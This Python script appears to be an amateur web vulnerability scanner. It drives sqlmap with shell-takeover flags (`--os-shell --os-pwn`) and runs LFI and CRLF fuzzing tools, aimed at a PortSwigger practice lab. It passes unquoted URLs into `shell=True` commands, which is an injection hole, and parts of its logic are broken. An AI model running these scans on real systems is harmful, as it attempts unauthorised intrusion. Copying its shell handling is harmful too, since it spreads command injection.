import os
import subprocess
from Operations import Operations
from api import reporting
threads = 50  # Adjust as needed for parallel processing

def execute_command(command):
    """Helper function to execute a shell command and return its output."""
    try:
        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        return result.stdout.decode('utf-8')
    except Exception as e:
        return str(e)

def sqli(end_points):
    errors = []
    reports = {}
    print("[●] Vulnerabilities Scanning  -  SQLi")
    patterns_file = 'patterns/sqli.txt'
    sqlmap_dir = 'vulnerabilities/sqlmap'
    Operations.mkdir(sqlmap_dir)
    for end_point in end_points:
        try:
            command = f"sqlmap -u {end_point} -b  --batch --disable-coloring --os-shell --os-pwn --random-agent --risk 3 --level 5 --output-dir={sqlmap_dir} 2> /dev/null"
            execute_command(command)
            domain_name = end_point.split('//')[-1].split('/')[0]
            result =Operations.get_file_content(f"{sqlmap_dir}/{domain_name}/log",'\n')
            ai_reponse=reporting(result,"this is the output of sqlmap scan, create a report for this in markdown, for critical,high,medium and low mention all details and make it comprehensive report")
            print(ai_reponse)
            with open (f"report_{domain_name}.md",'w') as file:
                file.write(ai_reponse)
        except Exception as e:
            errors.append(end_point)
            print(f"Exception running SQLi scan on {end_point}: {str(e)}")
    
    print("[●] Vulnerabilities Scanned  -  SQLi\t Found:", len(os.listdir(sqlmap_dir)))
    return errors, reports

def lfi(end_points):
    errors = []
    reports = {}
    print("[●] Vulnerabilities Scanning  -  LFI")
    payloads_file = '~/wordlists/payloads/lfi.txt'
    temp_lfi_file = 'temp/lfi.txt'
    lfi_file = 'vulnerabilities/lfi.txt'
    
    for end_point in end_points:
        try:
            command = f"cat patterns/lfi.txt | qsreplace {end_point}"
            result = execute_command(command)
            # Process result as needed
            # Example: Check if 'root:' is in result for LFI detection
            if 'root:' in result:
                reports[end_point] = f"[POTENTIAL LFI] - {end_point}"
        except Exception as e:
            errors.append(end_point)
            print(f"Exception running LFI scan on {end_point}: {str(e)}")
    
    print("[●] Vulnerabilities Scanned  -  LFI\t Found:", len(open(lfi_file).readlines()))
    return errors, reports

def crlf(end_points):
    errors = []
    reports = {}
    print("[●] Vulnerabilities Scanning  -  CRLF")
    alivesub_file = 'subdomains/alivesub.txt'
    crlf_file = 'vulnerabilities/crlf.txt'
    
    for end_point in end_points:
        try:
            command = f"crlfuzz -l {end_point} -c {threads} -s"
            result = execute_command(command)
            # Process result as needed
            # Example: Save results to crlf_file or process further
            with open(crlf_file, 'a') as f:
                f.write(result)
        except Exception as e:
            errors.append(end_point)
            print(f"Exception running CRLF scan on {end_point}: {str(e)}")
    
    print("[●] Vulnerabilities Scanned  -  CRLF\t Found:", len(open(crlf_file).readlines()))
    return errors, reports

# Similarly, implement other functions like subdomain_takeover, openredirect, ssrf, etc.

def main():
    # Example usage
    end_points = ['https://0aa5004d0319389b80902109000000df.web-security-academy.net/filter?category=Accessories']
    
    # Execute vulnerability scans
    sqli_errors, sqli_reports = sqli(end_points)
    # lfi_errors, lfi_reports = lfi(end_points)
    # crlf_errors, crlf_reports = crlf(end_points)
    
    # Process reports as needed
    print("SQLi Errors:", sqli_errors)
    print("SQLi Reports:", sqli_reports)
    # print("LFI Errors:", lfi_errors)
    # print("LFI Reports:", lfi_reports)
    # print("CRLF Errors:", crlf_errors)
    # print("CRLF Reports:", crlf_reports)

if __name__ == "__main__":
    main()
